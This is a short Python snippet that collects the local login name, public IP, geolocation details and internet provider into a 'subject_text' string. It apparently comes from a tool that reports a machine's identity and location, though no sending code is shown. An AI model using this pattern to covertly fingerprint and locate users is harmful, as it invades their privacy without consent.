from lib.ssw import GeoLocation
import os

# create an API key for this resource here > https://ipgeolocation.io/
locate = GeoLocation('YOUR_API_KEY') 

subject_text = f'''
    Name PC: {os.getlogin()} ||
    IP: {locate.ip_addr()} ||
    City: {locate.city()} ||
    State: {locate.region()} ||
    CEP: {locate.postal_code()} ||
    Country: {locate.country()} ||
    Lat: {locate.latitude()} ||
    Lon: {locate.longitude()} ||
    Provider: {locate.organization_name()}
'''